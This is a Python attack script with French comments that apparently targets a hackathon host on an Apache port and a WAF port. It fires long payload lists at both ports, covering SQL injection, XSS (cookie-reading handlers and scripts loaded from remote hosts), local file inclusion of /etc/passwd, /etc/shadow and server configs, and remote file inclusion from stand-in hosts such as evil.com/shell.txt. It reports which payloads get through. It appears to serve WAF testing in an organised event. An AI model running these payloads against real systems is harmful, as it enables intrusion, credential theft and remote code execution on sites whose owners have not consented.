import socket
import requests

#SQLI
#XSS
#LFI
#RFI
#HTTP

hostname = "Hackaton.linkmyaccounts.com"
portapache = 8004
portwaf = 8084

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(3)

result = sock.connect_ex((hostname, portapache))
result2 = sock.connect_ex((hostname, portwaf))
sock.close()
if result == 0:
    print(f"Port {portwaf} ouvert")
else:
    print(f"Port {portwaf} fermé ou injoignable")
if result2 == 0:
    print(f"Port {portapache} ouvert")
else:
    print(f"Port {portapache} fermé ou injoignable")

################### -------------SQLI--------------- ########################

param_name = "id"

sql_payloads = [
    "'",
    "''",
    "`",
    "``",
    ",",
    '"',
    '""',
    "//",
    "\\",
    "\\\\",
    ";",
    "' or \"",
    "-- or #",
    "' OR '1",
    "' OR 1 -- -",
    '" OR "" = "',
    '" OR 1 = 1 -- -',
    "' OR '' = '",
    "'='",
    "'LIKE'",
    "'=0--+",
    " OR 1=1",
    "' OR 'x'='x",
    "' AND id IS NULL; --",
    "'''''''''''''UNION SELECT '2",
    "%00",
    "/*…*/",
    "+",       
    "||",
    "%",      
    "@variable",
    "@@variable",
    "AND 1",
    "AND 0",
    "AND true",
    "AND false",
    "1-false",
    "1-true",
    "1*56",
    "-2",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "1' ORDER BY 1,2--+",
    "1' ORDER BY 1,2,3--+",
    "1' GROUP BY 1,2,--+",
    "1' GROUP BY 1,2,3--+",
    "' GROUP BY columnnames having 1=1 --",
    "-1' UNION SELECT 1,2,3--+",
    "' UNION SELECT sum(columnname ) from tablename --",
    "-1 UNION SELECT 1 INTO @,@",
    "-1 UNION SELECT 1 INTO @,@,@",
    "1 AND (SELECT * FROM Users) = 1",
    "' AND MID(VERSION(),1,1) = '5';",
    "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
    ",(select * from (select(sleep(10)))a)",
    "%2c(select%20*%20from%20(select(sleep(10)))a)",
    "';WAITFOR DELAY '0:0:30'--",
    "#",
    "/*",
    "-- -",
    ";%00",
    "`",
]


for payload in sql_payloads:
    url = f"http://{hostname}:{portwaf}/"
    params = {param_name: payload}
    
    try:
        response = requests.get(url, params=params, timeout=5)
        print(f"Test Payload : {payload}")
        print(f"URL appelée : {response.url}")
        print(f"Code HTTP : {response.status_code}")

        if response.status_code == 403 or "Forbidden" in response.text:
            print("WAF détecté ou requête bloquée")
        else:
            print("Pas de blocage apparent, à approfondir")

        print("-" * 50)

    except Exception as e:
        print(f"Erreur lors du test avec payload {payload} : {e}")

for payload in sql_payloads:
    url = f"http://{hostname}:{portapache}/"
    params = {param_name: payload}
    
    try:
        response = requests.get(url, params=params, timeout=5)
        print(f"Test Payload : {payload}")
        print(f"URL appelée : {response.url}")
        print(f"Code HTTP : {response.status_code}")

        if response.status_code == 403 or "Forbidden" in response.text:
            print("WAF détecté ou requête bloquée")
        else:
            print("Pas de blocage apparent, à approfondir")

        print("-" * 50)

    except Exception as e:
        print(f"Erreur lors du test avec payload {payload} : {e}")



################### -------------XSS--------------- ########################

xss_payloads = [
    "';alert(String.fromCharCode(88,83,83))//",
    "';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//",
    "\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    "'';!--\"<XSS>=&{()}",
    "0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>\"-confirm(3)-\"",
    "<script/src=data:,alert()>",
    "<marquee/onstart=alert()>",
    "<video/poster/onerror=alert()>",
    "<isindex/autofocus/onfocus=alert()>",
    "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",
    "<IMG SRC=\"javascript:alert('XSS');\">",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<IMG SRC=javascript:alert(\"XSS\")>",
    "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
    "<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
    "<a onmouseover=alert(document.cookie)>xxs link</a>",
    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<IMG SRC=# onmouseover=\"alert('xxs')\">",
    "<IMG SRC= onmouseover=\"alert('xxs')\">",
    "<IMG onmouseover=\"alert('xxs')\">",
    "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
    "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
    "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
    "<IMG SRC=\"jav	ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
    "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
    "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
    "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
    "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >",
    "<SCRIPT SRC=//ha.ckers.org/.j>",
    "<IMG SRC=\"javascript:alert('XSS')\"",
    "<iframe src=http://ha.ckers.org/scriptlet.html <",
    "\\\";alert('XSS');//",
    "</script><script>alert('XSS');</script>",
    "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>",
    "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
    "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
    "<IMG DYNSRC=\"javascript:alert('XSS')\">",
    "<IMG LOWSRC=\"javascript:alert('XSS')\">",
    "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>",
    "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
    "<IMG SRC=\"livescript:[code]\">",
    "<BODY ONLOAD=alert('XSS')>",
    "<BGSOUND SRC=\"javascript:alert('XSS');\">",
    "<BR SIZE=\"&{alert('XSS')}\">",
    "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
    "<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">",
    "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>",
    "<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">",
    "<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>",
    "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>",
    "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
    "<A STYLE='no\\xss:noxss(\"*//*\");xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>",
    "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>",
    "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
    "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>",
    "<XSS STYLE=\"xss:expression(alert('XSS'))\">",
    "<XSS STYLE=\"behavior: url(xss.htc);\">",
    "¼script¾alert(¢XSS¢)¼/script¾",
    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
    "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
    "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>",
    "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
    "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
    "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
    "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
    "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">",
    "<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">",
    "<DIV STYLE=\"width: expression(alert('XSS'))\">",
    "<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->",
    "<BASE HREF=\"javascript:alert('XSS');//\">",
    "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>",
    "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'\"-->",
    "<? echo('<SCR)';echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>",
    "<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">",
    "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">",
    "<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",
    "<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<SCRIPT a=\">'\"> SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<A HREF=\"http://66.102.7.147/\">XSS</A>",
    "0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>\"-confirm(3)-\"",
    "veris-->group<svg/onload=alert(/XSS/)//",
    "#\"><img src=M onerror=alert('XSS');>",
    "element[attribute='<img src=x onerror=alert('XSS');>",
    "[<blockquote cite=\"]\">[\" onmouseover=\"alert('RVRSH3LL_XSS');\" ]",
    "%22;alert%28%27RVRSH3LL_XSS%29//",
    "javascript:alert%281%29;",
    "<w contenteditable id=x onfocus=alert()>",
    "alert;pg(\"XSS\")",
    "<svg/onload=%26%23097lert%26lpar;1337)>",
    "<script>for((i)in(self))eval(i)(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>",
    "<sCR<script>iPt>alert(1)</SCr</script>IPt>",
    "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\">test</a>"
]


param_name = "q"

for payload in xss_payloads:
    url = f"http://{hostname}:{portwaf}/"
    params = {param_name: payload}
    
    try:
        response = requests.get(url, params=params, timeout=5)
        print(f"Test Payload : {payload}")
        print(f"URL appelée : {response.url}")
        print(f"Code HTTP : {response.status_code}")

        if response.status_code == 403 or "Forbidden" in response.text:
            print("WAF détecté ou requête bloquée")
        else:
            print("Pas de blocage apparent, à approfondir")

        print("-" * 50)

    except Exception as e:
        print(f"Erreur lors du test avec payload {payload} : {e}")

for payload in xss_payloads:
    url = f"http://{hostname}:{portapache}/"
    params = {param_name: payload}
    
    try:
        response = requests.get(url, params=params, timeout=5)
        print(f"Test Payload : {payload}")
        print(f"URL appelée : {response.url}")
        print(f"Code HTTP : {response.status_code}")

        if response.status_code == 403 or "Forbidden" in response.text:
            print("WAF détecté ou requête bloquée")
        else:
            print("Pas de blocage apparent, à approfondir")

        print("-" * 50)

    except Exception as e:
        print(f"Erreur lors du test avec payload {payload} : {e}")
        
################## -------------LFI--------------- ########################

lfi_payloads = [
    "../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "/etc/passwd",
    "../" * 10 + "etc/passwd",
    "../../../../../../etc/passwd%00",
    "/../../../../../../etc/passwd",
    "%00../../../../../../etc/passwd",
    "%00/etc/passwd%00",
    "%0a/bin/cat%20/etc/passwd",
    "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00",
    "/../../../../../../../../%2A",
    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%2F" * 12 + "etc/passwd",
    "..%5c" * 10 + "boot.ini",
    "admin/access_log",
    "/admin/install.php",
    "../../../administrator/inbox",
    "/apache2/logs/access_log",
    "/apache2/logs/error_log",
    "/apache/logs/access.log",
    "/apache/logs/error.log",
    "/apache/php/php.ini",
    "\\'/bin/cat%20/etc/passwd\\'",
    "/.bash_history",
    "/boot/grub/grub.conf",
    "/../../../../../../../../../../../boot.ini",
    "../" * 12 + "boot.ini",
    "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",
    "..//..//..//..//..//boot.ini",
    "/../../../../../../../../../../../boot.ini%00",
    "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini%00",
    "/../../../../../../../../../../../boot.ini%00.html",
    "/../../../../../../../../../../../boot.ini%00.jpg",
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "..%c0%af../" * 6 + "boot.ini",
    "/..%c0%af../" * 6 + "etc/passwd",
    "c:\\apache\\logs\\access.log",
    "c:\\apache\\logs\\error.log",
    "c:\\AppServ\\MySQL",
    "C:/boot.ini",
    "C:/inetpub/wwwroot/global.asa",
    "c:\\inetpub\\wwwroot\\global.asa",
    "../config.inc.php",
    "config.js",
    "../config.php",
    "../../../../../../../../conf/server.xml",
    "/etc/apache2/apache2.conf",
    "/etc/apache2/httpd.conf",
    "/etc/apache/httpd.conf",
    "/etc/apt/sources.list",
    "/etc/crontab",
    "/etc/fstab",
    "/etc/group",
    "/etc/hosts",
    "../../../../../../../../../../../../etc/hosts",
    "/etc/hosts.allow",
    "/etc/hosts.deny",
    "/etc/httpd/conf/httpd.conf",
    "/etc/httpd/logs/access_log",
    "../../../../../../../etc/httpd/logs/access_log",
    "/etc/httpd/logs/error_log",
    "../../../../../../../etc/httpd/logs/error_log",
    "/etc/inetd.conf",
    "/etc/init.d/apache",
    "/etc/init.d/apache2",
    "/etc/issue",
    "/etc/mail/access",
    "/etc/make.conf",
    "/etc/master.passwd",
    "/etc/motd",
    "/etc/my.cnf",
    "/etc/mysql/my.cnf",
    "/etc/nsswitch.conf",
    "/etc/passwd",
    "../../../../../../../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
    ".\\.\\.\\.\\.\\.\\.\\.\\.\\.\\etc\\passwd",
    "/etc/passwd%00",
    "../../../../../../../../../../../../etc/passwd%00",
    "/etc/php.ini",
    "/etc/proftp.conf",
    "/etc/resolv.conf",
    "/etc/security/group",
    "/etc/security/passwd",
    "/etc/shadow",
    "../../../../../../../../../../../../etc/shadow",
    "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow",
    "/etc/shadow%00",
    "/etc/ssh/sshd_config",
    "/etc/sudoers",
    "/etc/syslog.conf",
    "/etc/system",
    "/etc/vfstab",
    "/etc/vsftpd.conf",
    "/etc/wtmp",
    "/.htpasswd",
    "../.htpasswd",
    "../install.php",
    "../../../../../../../../../../../../localstart.asp",
    "/log/miscDir/accesslog",
]

param_name = "cmd"

for payload in lfi_payloads:
    url = f"http://{hostname}:{portwaf}/"
    params = {param_name: payload}

    try:
        response = requests.get(url, params=params, timeout=5)
        print(f"Test Payload : {payload}")
        print(f"URL appelée : {response.url}")
        print(f"Code HTTP : {response.status_code}")

        if response.status_code == 403 or "Forbidden" in response.text:
            print("WAF détecté ou requête bloquée")
        elif "root:x:" in response.text or "bin/bash" in response.text:
            print("LFI potentiellement exploitable !")
        else:
            print("Pas de blocage évident, approfondir l'analyse")

        print("-" * 50)

    except Exception as e:
        print(f"Erreur lors du test avec payload {payload} : {e}")

for payload in lfi_payloads:
    url = f"http://{hostname}:{portapache}/"
    params = {param_name: payload}

    try:
        response = requests.get(url, params=params, timeout=5)
        print(f"Test Payload : {payload}")
        print(f"URL appelée : {response.url}")
        print(f"Code HTTP : {response.status_code}")

        if response.status_code == 403 or "Forbidden" in response.text:
            print("WAF détecté ou requête bloquée")
        elif "root:x:" in response.text or "bin/bash" in response.text:
            print("LFI potentiellement exploitable !")
        else:
            print("Pas de blocage évident, approfondir l'analyse")

        print("-" * 50)

    except Exception as e:
        print(f"Erreur lors du test avec payload {payload} : {e}")

#################### -------------RFI--------------- ########################

rfi_payloads = [
    "http://evil.com/shell.txt",
    "http://attacker.com/malicious.txt",
    "http://127.0.0.1:8000/shell.txt",
    "https://example.com/shell.txt",
]

param_name = "file"

for payload in rfi_payloads:
    url = f"http://{hostname}:{portwaf}/"
    params = {param_name: payload}

    try:
        response = requests.get(url, params=params, timeout=5)
        print(f"Test Payload : {payload}")
        print(f"URL appelée : {response.url}")
        print(f"Code HTTP : {response.status_code}")

        if response.status_code == 403 or "Forbidden" in response.text:
            print("WAF détecté ou requête bloquée")
        elif "malicious" in response.text or "shell" in response.text:
            print("RFI potentiellement exploitable !")
        else:
            print("Pas de blocage évident, approfondir l'analyse")

        print("-" * 50)

    except Exception as e:
        print(f"Erreur lors du test avec payload {payload} : {e}")

for payload in rfi_payloads:
    url = f"http://{hostname}:{portapache}/"
    params = {param_name: payload}

    try:
        response = requests.get(url, params=params, timeout=5)
        print(f"Test Payload : {payload}")
        print(f"URL appelée : {response.url}")
        print(f"Code HTTP : {response.status_code}")

        if response.status_code == 403 or "Forbidden" in response.text:
            print("WAF détecté ou requête bloquée")
        elif "malicious" in response.text or "shell" in response.text:
            print("RFI potentiellement exploitable !")
        else:
            print("Pas de blocage évident, approfondir l'analyse")

        print("-" * 50)

    except Exception as e:
        print(f"Erreur lors du test avec payload {payload} : {e}")

#################### -------------HTTP VIOLATION--------------- ########################

#violations = [
#    b"GET / HTTP/1.1\r\nHost: hackaton.linkmyaccounts.com\r\nContent-Length: 10\r\n\r\n",  
#    b"GET / HTTP/1.0\r\nHost: hackaton.linkmyaccounts.com\r\nX-Extra-Header\r\n\r\n",      
#    b"POST / HTTP/1.1\r\nHost: hackaton.linkmyaccounts.com\r\nContent-Length: 5\r\n\r\n123", 
#    b"GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1\r\nHost: hackaton.linkmyaccounts.com\r\n\r\n", 
#]
#
#sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock2.settimeout(15)
#
#result = sock2.connect_ex((hostname, portwaf))
#for idx, payload in enumerate(violations):
#    print(f"\n--- Test {idx+1} ---")
#
#    try:
#        sock2.sendall(payload)
#        response = sock2.recv(1024)
#        print(response)
#        print(f"Test Payload : {payload}")      
#        if b"403" in response or b"Forbidden" in response:
#            print("WAF détecté, requête bloquée")
#        elif b"400" in response or b'' in response or "Bad Request" in response:
#            print("Incompréhension server !")
#        else:
#            print("Pas de blocage apparent, à analyser plus en profondeur")
#
#    except Exception as e:
#        print(f"Erreur lors du test : {e}")
#
#sock2.close()
